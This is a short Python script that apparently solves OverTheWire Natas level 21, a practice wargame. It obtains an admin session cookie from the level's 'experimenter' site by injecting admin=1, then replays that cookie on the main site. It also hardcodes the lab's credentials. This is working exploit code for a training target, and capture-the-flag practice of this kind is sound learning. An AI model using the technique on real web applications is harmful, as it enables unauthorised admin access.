import requests

target = 'http://natas21.natas.labs.overthewire.org'
auth = ('natas21', 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH')

exp_tar='http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1'


#First POST request to get session of admin from exp_tar
session=requests.Session()
response = session.post(exp_tar, auth=auth)
admin_session = session.cookies['PHPSESSID']
print(response.text)


#Second request to be admin
response = requests.get(target, auth=auth,cookies={"PHPSESSID":admin_session})
print(response.text)